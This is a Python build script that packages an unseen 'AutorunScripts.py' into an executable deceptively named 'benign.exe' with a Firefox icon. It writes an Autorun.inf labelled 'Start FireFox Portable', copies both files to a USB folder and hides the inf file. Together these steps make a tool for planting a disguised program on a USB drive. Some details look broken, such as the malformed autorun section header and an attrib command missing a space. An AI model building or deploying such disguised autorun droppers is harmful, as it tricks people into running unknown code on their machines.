import PyInstaller.__main__
import shutil
import os

filename = "AutorunScripts.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd,"USB")

if os.path.isfile(exename):
  os.remove(exename)

print("Creating EXE")

PyInstaller.__main__.run([
  "AutorunScripts.py",
  "--onefile",
  "--clean",
  "--log-level=ERROR",
  "--name="+exename,
  "--icon="+icon,
])

print("EXE Created")

shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

print("Creating Autorun file")

with open("Autorun.inf","w") as o:
  o.write("(Autorun)\n")
  o.write("Open="+exename+"\n")
  o.write("Action=Start FireFox Portable\n")
  o.write("Label=My USB\n")
  o.write("Icon="+exename+"\n")

print("Setting up USB")

shutil.move(exename,usbdir)
shutil.move("Autorun.inf",usbdir)
print("attrib +h"+os.path.join(usbdir,"Autorun.inf"))
os.system("attrib +h"+os.path.join(usbdir,"Autorun.inf"))